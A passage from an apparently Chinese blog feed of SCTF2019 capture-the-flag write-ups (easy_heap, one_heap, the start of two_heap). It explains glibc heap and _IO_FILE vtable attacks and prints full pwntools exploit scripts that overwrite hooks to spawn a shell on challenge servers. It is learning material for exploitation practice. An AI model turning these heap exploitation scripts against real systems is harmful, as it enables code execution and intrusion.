class="line"></span><br><span class="line">    Delete(p,<span class="number">2</span>)<span class="comment">#into 0x70 fast bins</span></span><br><span class="line">    Delete(p,<span class="number">1</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">    Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    <span class="comment">#Delete(p,0)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Delete(p,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10004</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
<h2 id="解法3-官方-x3h1n"><a href="#解法3-官方-x3h1n" class="headerlink" title="解法3(官方+x3h1n)"></a>解法3(官方+x3h1n)</h2><p>这个解法感觉是一个很好玩的套路，今天查了一天资料总算了解差不多了。emm但是感觉要写的东西太多，还是直接copy师姐的exp和分析(懒)</p>
<p>这个解法利用的IO_FILE攻击，之前我也做过一道题，写了点东西，但是那个只是写了利用的payload，对于具体利用的方式不甚了解，这里会详细一点。</p>
<h3 id="关于各种结构体及名词"><a href="#关于各种结构体及名词" class="headerlink" title="关于各种结构体及名词"></a>关于各种结构体及名词</h3><p>_IO_FILE_plus是最全面的一个结构体，它包括一个_IO_FILE结构体和一个IO_jump_t指针，同时，我们一会要用的_IO_list_all是它的结构体指针。尤其要注意的是，_IO_list_all 并不是一个描述文件的结构，而是它指向了一个可以描述文件的结构体头部，通常它指向 IO_2_1_stderr 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>
<p>_IO_FILE结构体就是我们常常利用的_IO_2_1_stdout_的数据类型，我们可以在Pwngdb中看到一个通常的结构体内容。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>如下图，_chain表示的是链表的下一个节点，紧跟在_IO_FILE后面有一个vtable，即我们所说的虚表，对应_IO_jump_t指针。<br><img src="/2020/09/03/SCTF2019/easy_heap/3.jpg" alt="_IO_FILE"><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这里在gdb去看一下，可以看到vtable里是一堆函数指针</p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/4.jpg" alt="vtable"></p>
<p>最终拿一张图总结一下(from 安全客)</p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/2.png" alt="io"></p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>首先利用堆溢出或者任意写将unsorted bin的bk修改_IO_list_all-0x10，根据unsorted bin攻击的原理，(_IO_list_all-0x10)-&gt;fd = unsorted_chunks(av)，结果是_IO_list_all的值被改成了main_arena+88，即main_arena+88被作为一个_IO_FILE结构体对待，注意_chain这里，指向的为smallbin[4]即0x60的第一个块。</p>
<p>为此，我们需要在smallbin[4]中构造一个假的_IO_FILE。这里用到的知识是当分配一个较小的size的chunk的时候，不符合unsorted bin的size会被放入到small bin中。我们先利用unlink把unsorted bin的size部分改为0x61，最后再分配一个0x1的chunk就可让这个chunk进入smallbin[4]<br>因为这个smallbin要作为我们的fake _IO_FILE，我们用unlink修改其vtable为0x555555756070，而这里存储的是mmap的地址，最终我们申请chunk触发unsorted bin attck，程序报错触发_IO_flush_all_lockp，从而执行mmap里的shellcode。</p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/6.jpg" alt="main_arena"></p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/7.jpg" alt="_chain"></p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/8.jpg" alt="smallbin"></p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/9.jpg" alt="vtable"></p>
<p>整个的流程可以用下面的图概括</p>
<p><img src="/2020/09/03/SCTF2019/easy_heap/5.png" alt="attack"></p>
<h3 id="x3h1n-py"><a href="#x3h1n-py" class="headerlink" title="x3h1n.py"></a>x3h1n.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line">   libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">"Address "</span>)</span><br><span class="line">   heap_ptr = int(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">print</span> hex(heap_ptr)</span><br><span class="line">   <span class="keyword">return</span> heap_ptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        mov rax,SYS_open</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        call here</span></span><br><span class="line"><span class="string">        .string "./flag"</span></span><br><span class="line"><span class="string">        here:</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_read</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_write</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rax,SYS_exit</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">mmap_addr = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unlink</span></span><br><span class="line">heap_list = add(<span class="number">0xf8</span>) - <span class="number">0x8</span> <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf0</span>)</span><br><span class="line">payload += p64(heap_list+<span class="number">0x8</span><span class="number">-0x18</span>) + p64(heap_list+<span class="number">0x8</span><span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##mmap_addr-&gt;shellcode</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(mmap_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,shellcode+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsorted bin size: 0x1c1-&gt;0x61</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x48'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin size</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x61\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsortedbin attack</span></span><br><span class="line"><span class="comment">##bk -&gt; IO_list_all-0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x58'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin bk</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x10\x25'</span>+<span class="string">'\n'</span>) <span class="comment">#IO_list_all</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##fake vtable</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x1000</span>) + <span class="string">'\x60'</span> + <span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_vtable = (heap_list - <span class="number">0x202060</span>) + <span class="number">0x202070</span></span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0xb8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">edit(<span class="number">3</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(mmap_addr) * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.xctf.org.cn/media/writeup/SCTF-Write-Up/site/sctf-wp/" target="_blank" rel="noopener">SCTF官方writeup</a></p>
<p><a href="https://www.anquanke.com/post/id/168802#h3-3" target="_blank" rel="noopener">安全客</a></p>
<p><a href="https://x3h1n.github.io/2019/06/24/SCTF2019-pwn/#more" target="_blank" rel="noopener">x3h1n</a></p>
]]></content>
      <categories>
        <category>SCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>one_heap</title>
    <url>/2020/09/03/SCTF2019/one_heap/</url>
    <content><![CDATA[<h1 id="SCTF2019-one-heap"><a href="#SCTF2019-one-heap" class="headerlink" title="SCTF2019 one_heap"></a>SCTF2019 one_heap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SCTF2019第一题，通过限制free和malloc的次数考验技巧</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序限制malloc的次数为15，free的次数为4次，存在double free，同时iput函数不会读入’\n’及之后的数据，因此输入’\n’即可保证不修改堆数据。</p>
<p>malloc的chunk地址存储在bss上，因此每次只能释放刚malloc的堆块</p>
<p><img src="/2020/09/03/SCTF2019/one_heap/1.jpg" alt="new"></p>
<p>free里可以double free</p>
<p><img src="/2020/09/03/SCTF2019/one_heap/2.jpg" alt="free"></p>
<p><img src="/2020/09/03/SCTF2019/one_heap/3.jpg" alt="input"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先用double free + 3次malloc将0x90的tcache bins的数量改为0xff，再free一个0x90的块即可让其放入unsorted bin。注意在free之前malloc一个块在它和top_chunk之间，避免unsorted bin与top chunk合并。</p>
<p>这时的效果是有一个unsorted bin和tcache bin重合，分配一个0x20的块，即可通过输入修改tcache的fd，下下次分配可以到这个地址上，这里修改后2字节爆破stdout结构体，分配一次0x90，下次就可以分配到stdout泄露地址。</p>
<p>这时候我们已经用了三次free，最后的一次free要配合chunk overlapping使用。</p>
<p>按照之前的设计，我们有一个chunk是避免unsorted bin合并的，我们分配一个大小为0x40的chunk，然后释放它，从而tcache bin[0x40]有一个堆。这里在其中构造一个fake chunk的prev_size和size，以绕过之后我们修改unsorted bin的检查</p>
<p>在刚才我们分配完0x20的堆块之后，已经出现了0x555555757310的unsorted bin和0x5555557572f0的tcache bins。我们通过Malloc(0x7f)修改掉unsorted bin的size为0x91(原本是0x61)，从而可以再下次分配分配到之前释放的0x40的tcache bin，进而修改其fd为任意地址，可以分配到这个地址上去。(下面0x20和0x90为之前构造绕过检查)</p>
<p><img src="/2020/09/03/SCTF2019/one_heap/4.jpg" alt="bins"></p>
<p><img src="/2020/09/03/SCTF2019/one_heap/5.jpg" alt="bins1"></p>
<p>最后我们覆盖malloc_hook为one_gadget发现打不通，因为gadgets的条件不满足。这里学习到了另一个技巧，即覆写realloc_hook为one_gadget，因为malloc_hook就在realloc_hook的后面，所以同时可以修改malloc_hook为realloc_addr+x，这个x为偏移，具体偏移多少要视情况而定。从而在执行malloc的时候执行malloc_hook-&gt;realloc+x-&gt;realloc_hook-&gt;one_gadget得到shell。</p>
<p>利用原理是realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。</p>
<p>流程为push寄存器，最后全部pop出来跳转至realloc_hook的值。<br>将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。</p>
<p><img src="/2020/09/03/SCTF2019/one_heap/6.jpg" alt="push"></p>
<p><img src="/2020/09/03/SCTF2019/one_heap/7.jpg" alt="pop"></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0xe569f</span>,<span class="number">0xe5858</span>,<span class="number">0xe585f</span>,<span class="number">0xe5863</span>,<span class="number">0x10a398</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input the content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    New(p,<span class="number">0x7f</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">    New(p,<span class="number">0x7f</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    Delete(p)<span class="comment">#1</span></span><br><span class="line">    Delete(p)<span class="comment">#2</span></span><br><span class="line">    New(p,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x90</span>)+<span class="string">'\x20'</span>+<span class="string">'\n'</span>)<span class="comment">#3 in case unsorted bin be involved by top chunk</span></span><br><span class="line">    Delete(p)</span><br><span class="line"></span><br><span class="line">    New(p,<span class="number">0x7f</span>,<span class="string">'\n'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    New(p,<span class="number">0x7f</span>,<span class="string">'\n'</span>)<span class="comment">#5</span></span><br><span class="line">    New(p,<span class="number">0x7f</span>,<span class="string">'\n'</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(p)<span class="comment">#3</span></span><br><span class="line">    <span class="comment">#got unsorted bin</span></span><br><span class="line">    New(p,<span class="number">0x20</span>,<span class="string">'\x60\x07\xdd\n'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    New(p,<span class="number">0x7f</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">'\n'</span>)<span class="comment">#8 make overlapping chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    New(p,<span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00\n'</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd18b0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    realloc_hook = libc.symbols[<span class="string">'__realloc_hook'</span>] + libc_base</span><br><span class="line">    realloc = libc_base + libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    New(p, <span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">11</span> + p64(<span class="number">0x41</span>) + p64(realloc_hook))<span class="comment">#10</span></span><br><span class="line">    <span class="comment">#overwrite realloc_hook to one_gadget</span></span><br><span class="line">    New(p,<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#11</span></span><br><span class="line">    New(p,<span class="number">0x38</span>,p64(one_gadget)+p64(realloc+<span class="number">4</span>)+<span class="string">'\n'</span>)<span class="comment">#12</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    New(p,<span class="number">0x20</span>,<span class="string">'xmzyshypnc\n'</span>)<span class="comment">#13</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./one_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10001</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>two_heap</title>
    <url>/2020/09/03/SCTF2019/two_heap/</url>
    <content><![CDATA[<h1 id="SCTF2019-two-heap"><a href="#SCTF2019-two-heap" class="headerlink" title="SCTF2019 two_heap"></a>SCTF2019 two_heap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个冷知识=半小时内解决一道题</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序还是只有Malloc和Free。</p>
<p>main函数里有个printf的格式化字符串漏洞但是printf_chk似乎不能非连续地输入%x%nx这样。</p>
<p><img src="/2020/09/03/SCTF2019/two_heap/3.jpg" alt="main"></p>
